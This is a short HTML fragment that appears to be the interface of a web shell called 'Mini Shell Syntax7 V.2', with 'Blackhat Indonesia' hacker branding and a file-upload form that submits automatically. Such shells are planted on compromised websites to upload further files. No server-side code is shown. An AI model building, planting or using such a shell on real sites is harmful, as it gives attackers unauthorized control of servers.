...
<!DOCTYPE html>
	...
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="Blackhat Indonesia">


				<title>Mini Shell Syntax7</title>
		...
		<body bgcolor="lime">
			...
			<header>
				...
				<div class="y x">
					...
					Mini Shell Syntax7 V.2 
					<i>Indonesia Hacker Rulez<i>
				...
				<div class="u">
					...
					<form method="post" enctype="multipart/form-data">
						...
						<label class="l w">
							...
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp; Upload Woy
